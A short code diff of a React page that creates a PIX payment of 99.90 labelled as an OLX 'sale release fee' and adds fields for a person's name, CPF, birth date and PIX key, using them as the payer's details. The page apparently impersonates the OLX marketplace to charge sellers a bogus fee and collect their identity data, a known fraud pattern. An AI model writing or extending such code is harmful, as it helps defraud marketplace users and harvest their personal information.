@@ -5,7 +5,17 @@ import { useState, useEffect, useRef } from "react";
 import { trpc } from "@/lib/trpc";
 import { toast } from "sonner";
 
-export default function Home() {
+type Props = {
+  dados?: {
+    nome: string;
+    cpf: string;
+    nascimento: string;
+    tipoChave: string;
+    chavePix: string;
+  };
+};
+
+export default function Home({ dados }: Props) {
   let { user, loading, error, isAuthenticated, logout } = useAuth();
 
   const [qrCode, setQrCode] = useState<string | null>(null);
@@ -71,8 +81,8 @@ export default function Home() {
     createDeposit.mutate({
       amount: 99.90,
       description: "Taxa de Liberação de Venda - OLX",
-      payerName: "Cliente OLX",
-      payerDocument: "00000000000",
+      payerName: dados?.nome ?? "Cliente OLX",
+      payerDocument: (dados?.cpf ?? "00000000000").replace(/\D/g, ""),
     });
   };
 
